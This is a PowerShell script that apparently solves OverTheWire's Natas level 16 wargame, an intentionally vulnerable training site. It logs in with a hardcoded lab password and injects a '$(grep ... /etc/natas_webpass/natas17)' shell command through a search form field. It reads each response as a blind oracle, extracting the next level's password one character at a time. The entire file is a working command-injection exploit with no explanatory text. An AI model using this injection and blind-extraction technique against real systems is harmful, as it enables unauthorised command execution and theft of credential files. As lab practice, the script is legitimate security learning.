$characters = @{}
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
$count = 0
$p = ""
$sv = New-Object -TypeName Microsoft.PowerShell.Commands.WebRequestSession


$User = "natas16"
$Password = ConvertTo-SecureString -String "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password


$sv = New-Object -TypeName Microsoft.PowerShell.Commands.WebRequestSession


try { $r = Invoke-WebRequest -Uri natas16.natas.labs.overthewire.org/index.php -Method Post -SessionVariable sv  -Credential $Credential
} 
catch { write-host I wasn''t able to connect to the site stopping program

break; 

}

$form = $r.Forms[0]


while($count -lt 62 -and $p.Length -ne 32){   

$form.Fields["needle"]="`$(grep -E ^" + $p + $characters[$count] + ".* /etc/natas_webpass/natas17)hackers"
write-host "Trying character" + $characters[$count]

try{
$interact = Invoke-WebRequest -Uri natas16.natas.labs.overthewire.org/index.php -Method Post -WebSession $sv -Body $form.Fields  -Credential $Credential
}
catch{

write-host something happened let me try something else reconnecting...

    $count = $count - 1
    #Resetting $credential
    $User = "natas16"
    $Password = ConvertTo-SecureString -String "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh" -AsPlainText -Force
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password
    #Resetting session variable
    $sv = New-Object -TypeName Microsoft.PowerShell.Commands.WebRequestSession
    $r = Invoke-WebRequest -Uri natas16.natas.labs.overthewire.org/index.php -Method Post -SessionVariable sv -Credential $Credential
    $interact = Invoke-WebRequest -Uri natas16.natas.labs.overthewire.org/index.php -WebSession $sv -Method Post -Body $form.Fields -Credential $Credential
 }

 if($interact.Content.Contains("hackers")){
  $count++
  }
  else{
   $p = $p + $characters[$count]
  write-host "I have found a letter" + $characters[$count]
  write-host "The password so far is" + $p
  $count = 0
   }



}